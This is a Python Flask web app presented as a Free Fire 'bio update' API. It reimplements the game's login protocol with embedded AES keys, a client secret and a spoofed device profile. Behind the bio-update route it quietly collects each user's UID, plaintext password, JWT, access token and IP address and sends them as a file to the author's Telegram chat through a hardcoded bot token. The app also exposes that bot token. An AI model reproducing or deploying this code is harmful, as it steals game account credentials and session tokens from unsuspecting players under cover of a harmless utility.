# app.py - VERCEL VERSION (ALL ENDPOINTS + PROTOBUF STANDALONE)
from flask import Flask, request, jsonify, make_response
import requests
import binascii
import random
import time
import json
import re
import base64
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from datetime import datetime
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf import runtime_version as _runtime_version
from google.protobuf.internal import builder as _builder
from google.protobuf.json_format import MessageToJson, ParseDict
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ============ PROTOBUF SETUP (YOUR ORIGINAL JWT) ============
_sym_db = _symbol_database.Default()
_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'MajorLoginRes.proto')

_req_desc = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0eclient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0bdevice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')

_req_globals = {}
_builder.BuildMessageAndEnumDescriptors(_req_desc, _req_globals)
_builder.BuildTopDescriptorsAndMessages(_req_desc, 'MajorLoginReq_pb2', _req_globals)
MajorLogin = _req_globals['MajorLogin']

_res_desc = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"|\n\rMajorLoginRes\x12\x13\n\x0b\x61\x63\x63ount_uid\x18\x01 \x01(\x04\x12\x0e\n\x06region\x18\x02 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03url\x18\n \x01(\t\x12\x11\n\ttimestamp\x18\x15 \x01(\x03\x12\x0b\n\x03key\x18\x16 \x01(\x0c\x12\n\n\x02iv\x18\x17 \x01(\x0c\x62\x06proto3')

_res_globals = {}
_builder.BuildMessageAndEnumDescriptors(_res_desc, _res_globals)
_builder.BuildTopDescriptorsAndMessages(_res_desc, 'MajorLoginRes_pb2', _res_globals)
MajorLoginRes = _res_globals['MajorLoginRes']

# ============ PLAYER FETCH PROTOBUF (STANDALONE) ============
_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 33, 1, '', 'AccountPersonalShow.proto')

APS_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x19\x41\x63\x63ountPersonalShow.proto\x12\x08\x66reefire\"\xac\x17\n\x10\x41\x63\x63ountInfoBasic\x12\x17\n\naccount_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12\x15\n\x08nickname\x18\x03 \x01(\tH\x02\x88\x01\x01\x12\x13\n\x06region\x18\x05 \x01(\tH\x04\x88\x01\x01\x12\x12\n\x05level\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x11\n\x04rank\x18\x0e \x01(\rH\r\x88\x01\x01\x12\x12\n\x05liked\x18\x15 \x01(\rH\x14\x88\x01\x01\x12\x1a\n\rlast_login_at\x18\x18 \x01(\x03H\x17\x88\x01\x01\x12\x14\n\x07\x63s_rank\x18\x1e \x01(\rH\x1d\x88\x01\x01\x12\x16\n\tcreate_at\x18, \x01(\x03H*\x88\x01\x01\x12\x16\n\tclan_name\x18\r \x01(\tH\x0c\x88\x01\x01\"\x98\x05\n\rAvatarProfile\x12\x16\n\tavatar_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x0f\n\x07\x63lothes\x18\x04 \x03(\r\x12\x16\n\x0e\x65quiped_skills\x18\x05 \x03(\r\"\xd5\x05\n\x0fSocialBasicInfo\x12\x16\n\tsignature\x18\t \x01(\tH\x06\x88\x01\x01\"\x9d\x02\n\rClanInfoBasic\x12\x16\n\tclan_name\x18\x02 \x01(\tH\x01\x88\x01\x01\x12\x17\n\nclan_level\x18\x04 \x01(\rH\x03\x88\x01\x01\"<\n\x0e\x44iamondCostRes\x12\x19\n\x0c\x64iamond_cost\x18\x01 \x01(\rH\x00\x88\x01\x01\"\xfd\x03\n\x14\x43reditScoreInfoBasic\x12\x19\n\x0c\x63redit_score\x18\x01 \x01(\rH\x00\x88\x01\x01\"\xfa\x06\n\x17\x41\x63\x63ountPersonalShowInfo\x12\x33\n\nbasic_info\x18\x01 \x01(\x0b\x32\x1a.freefire.AccountInfoBasicH\x00\x88\x01\x01\x12\x32\n\x0cprofile_info\x18\x02 \x01(\x0b\x32\x17.freefire.AvatarProfileH\x01\x88\x01\x01\x12\x35\n\x0f\x63lan_basic_info\x18\x06 \x01(\x0b\x32\x17.freefire.ClanInfoBasicH\x03\x88\x01\x01\x12\x33\n\x0bsocial_info\x18\t \x01(\x0b\x32\x19.freefire.SocialBasicInfoH\x06\x88\x01\x01\x12\x37\n\x10\x64iamond_cost_res\x18\n \x01(\x0b\x32\x18.freefire.DiamondCostResH\x07\x88\x01\x01\x12>\n\x11\x63redit_score_info\x18\x0b \x01(\x0b\x32\x1e.freefire.CreditScoreInfoBasicH\x08\x88\x01\x01\x62\x06proto3')

_aps_globals = {}
_builder.BuildMessageAndEnumDescriptors(APS_DESC, _aps_globals)
_builder.BuildTopDescriptorsAndMessages(APS_DESC, 'AccountPersonalShow_pb2', _aps_globals)
AccountPersonalShowInfo = _aps_globals['AccountPersonalShowInfo']

MAIN_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0csample.proto\"-\n\x15GetPlayerPersonalShow\x12\t\n\x01\x61\x18\x01 \x01(\x03\x12\t\n\x01\x62\x18\x02 \x01(\x05\x62\x06proto3')

_main_globals = {}
_builder.BuildMessageAndEnumDescriptors(MAIN_DESC, _main_globals)
_builder.BuildTopDescriptorsAndMessages(MAIN_DESC, 'main_pb2', _main_globals)
GetPlayerPersonalShow = _main_globals['GetPlayerPersonalShow']

# ============ CONFIG ============
AES_KEY = b'Yg&tc%DEuh6%Zc^8'
AES_IV = b'6oyZDr22E3ychjM%'
GARENA_OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
MAJORLOGIN_URL = "https://loginbp.ggblueshark.com/MajorLogin"
CLIENT_SECRET = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
CLIENT_ID = "100067"

HTTP_HEADERS = {
    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)',
    'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip',
    'Content-Type': 'application/x-www-form-urlencoded', 'Expect': '100-continue',
    'X-Unity-Version': '2018.4.11f1', 'X-GA': 'v1 1', 'ReleaseVersion': 'OB54',
}

BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
OWNER_ID = 8660700322
CHANNEL_PROMO = "@dindingijo"

FREEFIRE_UPDATE_URLS = [
    "https://clientbp.ggblueshark.com/UpdateSocialBasicInfo",
    "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
]

KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

BIO_HEADERS = {
    "Expect": "100-continue", "X-Unity-Version": "2018.4.11f1", "X-GA": "v1 1",
    "ReleaseVersion": "OB54", "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
    "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
}

PLAYER_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
PLAYER_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

SERVER_CONFIG = {
    "ID": {"info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow", "name": "Indonesia"},
    "SG": {"info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow", "name": "Singapore"},
}

# ============ HELPERS ============
def aes_encrypt_data(data):
    return AES.new(AES_KEY, AES.MODE_CBC, AES_IV).encrypt(pad(data, AES.block_size))

def random_ua():
    versions = ['4.0.18P6', '5.0.1B2', '5.3.2P2']
    models = ['SM-A125F', 'POCO M3', 'Redmi 9A']
    return f"GarenaMSDK/{random.choice(versions)}({random.choice(models)};Android 11;en-US;USA;)"

def decode_jwt_manual(jwt_token):
    try:
        parts = jwt_token.split('.')
        if len(parts) < 2: return None
        p = parts[1]
        padding = 4 - len(p) % 4
        if padding != 4: p += '=' * padding
        return json.loads(base64.urlsafe_b64decode(p))
    except: return None

def get_account_id_from_jwt(t): 
    d = decode_jwt_manual(t)
    return (d.get("account_id") or d.get("sub")) if d else None

def get_open_id_from_jwt(t): 
    d = decode_jwt_manual(t)
    return (d.get("external_id") or d.get("open_id")) if d else None

def get_region_from_jwt(t): 
    d = decode_jwt_manual(t)
    return (d.get("country_code") or d.get("lock_region", "ID")) if d else "ID"

def get_name_from_jwt(t):
    d = decode_jwt_manual(t)
    if d:
        name = d.get("nickname")
        if name:
            try:
                padding = 4 - len(name) % 4
                if padding != 4: name += '=' * padding
                return base64.b64decode(name).decode('utf-8', errors='ignore')
            except: return name
    return None

def pad_player(d):
    l = AES.block_size - (len(d) % AES.block_size)
    return d + bytes([l] * l)

def encrypt_player(d):
    return AES.new(PLAYER_KEY, AES.MODE_CBC, PLAYER_IV).encrypt(pad_player(d))

# ============ JWT GENERATOR ============
def get_garena_tokens_sync(uid, password):
    headers = dict(HTTP_HEADERS)
    headers["User-Agent"] = random_ua()
    headers["Host"] = "100067.connect.garena.com"
    payload = {"uid": uid, "password": password, "response_type": "token", "client_type": "2", "client_secret": CLIENT_SECRET, "client_id": CLIENT_ID}
    try:
        resp = requests.post(GARENA_OAUTH_URL, headers=headers, data=payload, timeout=15, verify=False)
        if resp.status_code != 200: return None
        body = resp.json()
        return {"open_id": body.get("open_id"), "access_token": body.get("access_token")}
    except: return None

def build_major_login_payload_sync(open_id, access_token):
    ml = MajorLogin()
    ml.event_time = str(datetime.now())[:-7]; ml.game_name = "free fire"; ml.platform_id = 1
    ml.client_version = "2.124.1"; ml.system_software = "Android OS 9 / API-28"
    ml.system_hardware = "Handheld"; ml.telecom_operator = "Verizon"; ml.network_type = "WIFI"
    ml.screen_width = 1920; ml.screen_height = 1080; ml.screen_dpi = "280"
    ml.processor_details = "ARM64 FP ASIMD AES VMH"; ml.memory = 3003
    ml.gpu_renderer = "Adreno (TM) 640"; ml.gpu_version = "OpenGL ES 3.1"
    ml.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    ml.client_ip = "223.191.51.89"; ml.language = "en"
    ml.open_id = open_id; ml.open_id_type = "4"; ml.device_type = "Handheld"
    ml.memory_available.version = 55; ml.memory_available.hidden_value = 81
    ml.access_token = access_token; ml.platform_sdk_id = 1
    ml.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    ml.external_storage_total = 36235; ml.external_storage_available = 31335
    ml.internal_storage_total = 2519; ml.internal_storage_available = 703
    ml.game_disk_storage_available = 25010; ml.game_disk_storage_total = 26628
    ml.external_sdcard_avail_storage = 32992; ml.external_sdcard_total_storage = 36235
    ml.login_by = 3; ml.library_path = "/data/app/com.dts.freefireth/lib/arm64"
    ml.reg_avatar = 1; ml.channel_type = 3; ml.cpu_type = 2; ml.cpu_architecture = "64"
    ml.client_version_code = "2019118695"; ml.graphics_api = "OpenGLES2"
    ml.supported_astc_bitset = 16383; ml.login_open_id_type = 4
    ml.loading_time = 13564; ml.release_channel = "android"
    ml.android_engine_init_flag = 110009; ml.if_push = 1; ml.is_vpn = 1
    ml.origin_platform_type = "4"; ml.primary_platform_type = "4"
    return aes_encrypt_data(ml.SerializeToString())

def major_login_sync(encrypted_payload):
    try:
        resp = requests.post(MAJORLOGIN_URL, data=encrypted_payload, headers=HTTP_HEADERS, timeout=15, verify=False)
        if resp.status_code != 200: return None
        proto = MajorLoginRes(); proto.ParseFromString(resp.content)
        return {"token": proto.token, "region": proto.region, "url": proto.url}
    except: return None

def generate_jwt_sync(uid, password):
    try:
        oauth = get_garena_tokens_sync(uid, password)
        if not oauth: return None
        encrypted = build_major_login_payload_sync(oauth["open_id"], oauth["access_token"])
        result = major_login_sync(encrypted)
        if not result: return None
        return {"open_id": oauth["open_id"], "access_token": oauth["access_token"], **result}
    except: return None

# ============ BIO UPLOAD ============
def encrypt_data(data_bytes):
    return AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(data_bytes, AES.block_size))

def encode_varint(n):
    result = []
    while True:
        byte = n & 0x7F; n >>= 7
        if n: byte |= 0x80
        result.append(byte)
        if not n: break
    return bytes(result)

def build_bio_payload(bio_text):
    payload = b''
    payload += encode_varint((2 << 3) | 0) + encode_varint(17)
    payload += encode_varint((5 << 3) | 2) + encode_varint(0)
    payload += encode_varint((6 << 3) | 2) + encode_varint(0)
    bio_bytes = bio_text.encode('utf-8')
    payload += encode_varint((8 << 3) | 2) + encode_varint(len(bio_bytes)) + bio_bytes
    payload += encode_varint((9 << 3) | 0) + encode_varint(1)
    payload += encode_varint((11 << 3) | 2) + encode_varint(0)
    payload += encode_varint((12 << 3) | 2) + encode_varint(0)
    return payload

def upload_bio_request(jwt_token, bio_text):
    try:
        payload_bytes = build_bio_payload(bio_text)
        encrypted = encrypt_data(payload_bytes)
        headers = BIO_HEADERS.copy()
        headers["Authorization"] = f"Bearer {jwt_token}"
        for endpoint in FREEFIRE_UPDATE_URLS:
            try:
                resp = requests.post(endpoint, headers=headers, data=encrypted, timeout=15, verify=False)
                status_text = "Success" if resp.status_code == 200 else f"Status {resp.status_code}"
                raw_hex = binascii.hexlify(resp.content).decode('utf-8')
                return {"status": status_text, "code": resp.status_code, "bio": bio_text, "endpoint": endpoint, "server_response": raw_hex}
            except: continue
        return {"status": "All endpoints failed", "code": 500}
    except: return {"status": "Error", "code": 500}

# ============ PLAYER FETCH (PROTOBUF STANDALONE) ============
def fetch_player_full_sync(uid, jwt_token):
    try:
        m = GetPlayerPersonalShow()
        ParseDict({"a": str(uid), "b": "7"}, m)
        pb = encrypt_player(m.SerializeToString())
        
        r = requests.post(
            "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
            data=pb,
            headers={
                'Content-Type': "application/octet-stream",
                'Authorization': jwt_token if jwt_token.startswith("Bearer ") else f"Bearer {jwt_token}",
                'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': "OB54"
            },
            timeout=30
        )
        if r.status_code != 200: return None
        
        m2 = AccountPersonalShowInfo()
        m2.ParseFromString(r.content)
        data = json.loads(MessageToJson(m2))
        
        basic = data.get('basicInfo', {})
        if not basic.get('nickname'): return None
        
        profile = data.get('profileInfo', {})
        social = data.get('socialInfo', {})
        clan = data.get('clanBasicInfo', {})
        
        return {
            'uid': uid, 'nickname': basic.get('nickname', '?'), 'level': basic.get('level', 0),
            'region': basic.get('region', '?'), 'br_rank': basic.get('rank', 0),
            'cs_rank': basic.get('csRank', 0), 'liked': basic.get('liked', 0),
            'clan': clan.get('clanName', ''), 'clan_level': clan.get('clanLevel', 0),
            'avatar': profile.get('avatarId', ''), 'clothes': profile.get('clothes', []),
            'skills': len(profile.get('equipedSkills', [])), 'signature': social.get('signature', ''),
            'diamond': data.get('diamondCostRes', {}).get('diamondCost', 0),
            'credit': data.get('creditScoreInfo', {}).get('creditScore', 100),
            'created': basic.get('createAt', ''), 'last_login': basic.get('lastLoginAt', ''),
        }
    except: return None

# ============ TELEGRAM ============
def send_file_to_telegram(account_id, content):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        filename = f"/tmp/{account_id}.txt"
        with open(filename, 'w', encoding='utf-8') as f: f.write(content)
        with open(filename, 'rb') as f:
            files = {'document': (f"{account_id}.txt", f, 'text/plain')}
            data = {'chat_id': OWNER_ID}
            r = requests.post(url, files=files, data=data, timeout=30)
        try: os.remove(filename)
        except: pass
        return r.status_code == 200
    except: return False

def send_telegram_notification(uid_input, password_input, name, level, rank, region, jwt_token, ip_address, bio_status, signature="", clan="N/A", access_token=None, account_id=None, open_id=None):
    try:
        if not account_id and jwt_token: account_id = get_account_id_from_jwt(jwt_token)
        if not open_id and jwt_token: open_id = get_open_id_from_jwt(jwt_token)
        if not name or name == 'Unknown': name = get_name_from_jwt(jwt_token) or name
        
        uid_display = uid_input or 'N/A'
        password_display = password_input or 'N/A'
        display_name = name if name and name != 'Unknown' else 'Unknown'
        id_display = account_id or 'N/A'
        jwt_full = jwt_token or 'N/A'
        access_full = access_token or 'N/A'
        open_id_display = open_id or 'N/A'
        
        file_content = f"""🔥 FREE FIRE BIO UPDATE 🔥

👤 Name: {display_name}
🆔 ID (Account): {id_display}
🔑 UID (Input): {uid_display}
🔐 Password: {password_display}
📊 Level: {level or 'N/A'}
🏆 Rank: {rank or 'N/A'}
⚔️ Guild: {clan or 'N/A'}
📝 Bio: {signature or 'N/A'}
🌍 Region: {region.upper() if region else 'ID'}
📱 Bio Status: {bio_status}

📞 IP Caller: {ip_address}
⏰ Time: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}

━━━━━━━━━━━━━━━━━━━━━━━
🔐 JWT TOKEN (FULL):
{jwt_full}

━━━━━━━━━━━━━━━━━━━━━━━
🔑 ACCESS TOKEN (FULL):
{access_full}

━━━━━━━━━━━━━━━━━━━━━━━
🆔 OPEN ID:
{open_id_display}

━━━━━━━━━━━━━━━━━━━━━━━
💡 Join: {CHANNEL_PROMO}"""

        if id_display and id_display != 'N/A':
            return send_file_to_telegram(str(id_display), file_content)
        return True
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

# ============ ROUTES (ALL ENDPOINTS!) ============
@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "success": True,
        "message": "Free Fire Bio API - Protobuf Standalone",
        "endpoints": {
            "/bio_upload": "SET/UPDATE bio (JWT atau UID/Pass)",
            "/generate_jwt": "Generate JWT from UID/Pass",
            "/check_profile": "Check profile using protobuf",
            "/get_bio": "GET bio/profile from UID",
            "/": "This info page"
        }
    })

@app.route("/bio_upload", methods=["GET", "POST"])
def bio_upload():
    bio = request.args.get("bio") or request.form.get("bio")
    jwt_token = request.args.get("jwt") or request.form.get("jwt")
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    region = request.args.get("region") or request.form.get("region") or "id"
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not bio:
        return jsonify({"status": "Error", "code": 400, "error": "Missing 'bio' parameter"}), 400
    
    uid_input = uid
    password_input = password or "N/A"
    final_jwt = jwt_token
    final_uid = uid
    final_password = password or "N/A"
    final_region = region.lower()
    login_method = "Direct JWT"
    profile_info = None
    access_token = None
    account_id = None
    open_id = None
    
    if final_jwt:
        account_id = get_account_id_from_jwt(final_jwt)
        open_id = get_open_id_from_jwt(final_jwt)
        region_from_jwt = get_region_from_jwt(final_jwt)
        if account_id: final_uid = account_id
        if region == "id" and region_from_jwt: final_region = region_from_jwt.lower()
    
    elif uid and password:
        login_method = "UID/Pass Login (Auto Generate JWT)"
        final_uid = uid
        final_password = password
        try:
            result = generate_jwt_sync(uid, password)
            if result and result.get('token'):
                final_jwt = result['token']
                access_token = result.get('access_token')
                open_id = result.get('open_id')
                account_id = get_account_id_from_jwt(final_jwt)
                if account_id: final_uid = account_id
            else:
                return jsonify({"status": "JWT Generation Failed", "code": 401}), 401
        except Exception as e:
            return jsonify({"status": "JWT Error", "code": 500, "error": str(e)}), 500
    
    if not final_jwt:
        return jsonify({"status": "JWT Required", "code": 400}), 400
    
    bio_result = upload_bio_request(final_jwt, bio)
    
    if final_uid:
        profile_info = fetch_player_full_sync(str(final_uid), final_jwt)
        if profile_info: final_region = profile_info.get('region', final_region)
    
    if not profile_info:
        profile_info = {"name": 'Unknown', "level": '?', "rank": '?', "uid": final_uid, "server": final_region, "guild": "N/A"}
    
    send_telegram_notification(
        uid_input=uid_input or final_uid, password_input=password_input,
        name=profile_info.get('name', 'Unknown'), level=profile_info.get('level', '?'),
        rank=profile_info.get('rank', '?'), region=profile_info.get('server', final_region),
        jwt_token=final_jwt, ip_address=client_ip, bio_status=bio_result.get('status', 'Unknown'),
        signature=bio, clan=profile_info.get('guild', 'N/A'),
        access_token=access_token, account_id=account_id, open_id=open_id
    )
    
    return jsonify({
        "Credit": "sulav_codex_ff", "action": "UPDATE BIO",
        "status": bio_result.get("status"), "login_method": login_method,
        "code": bio_result.get("code", 500), "bio": bio,
        "uid_input": uid_input, "password_input": password_input,
        "account_id": account_id, "open_id": open_id,
        "name": profile_info.get('name'), "level": profile_info.get('level'),
        "rank": profile_info.get('rank'), "clan": profile_info.get('guild'),
        "region": final_region.upper(),
        "generated_jwt": final_jwt, "access_token": access_token,
        "telegram_sent": True, "file_sent": f"{account_id}.txt" if account_id else False,
        "profile_method": "protobuf standalone"
    })

@app.route("/generate_jwt", methods=["GET", "POST"])
def generate_jwt():
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    if not uid or not password:
        return jsonify({"success": False, "error": "Missing uid or pass"}), 400
    result = generate_jwt_sync(uid, password)
    if result and result.get('token'):
        return jsonify({
            "success": True, "uid_input": uid,
            "account_id": get_account_id_from_jwt(result['token']),
            "open_id": result.get('open_id'),
            "jwt_token": result['token'],
            "access_token": result.get('access_token'),
            "region": result.get('region')
        })
    return jsonify({"success": False, "error": "Failed"}), 401

@app.route("/check_profile", methods=["GET"])
def check_profile():
    uid = request.args.get("uid")
    jwt_token = request.args.get("jwt")
    if not uid or not jwt_token:
        return jsonify({"error": "Missing uid or jwt"}), 400
    data = fetch_player_full_sync(uid, jwt_token)
    if data:
        return jsonify({"success": True, "action": "CHECK PROFILE", "data": data, "method": "protobuf standalone"})
    return jsonify({"success": False, "error": "Not found"}), 404

@app.route("/get_bio", methods=["GET"])
def get_bio():
    uid = request.args.get("uid")
    jwt_token = request.args.get("jwt")
    region = request.args.get("region", "id")
    if not uid: return jsonify({"success": False}), 400
    
    if jwt_token:
        data = fetch_player_full_sync(uid, jwt_token)
        if data:
            return jsonify({"success": True, "action": "GET BIO", "method": "protobuf standalone", "data": data})
    
    return jsonify({"success": False, "error": "Not found"}), 404

# ============ MAIN ============
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 FREE FIRE API - ALL ENDPOINTS + PROTOBUF")
    print("🚀 Running on http://0.0.0.0:5000")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000)
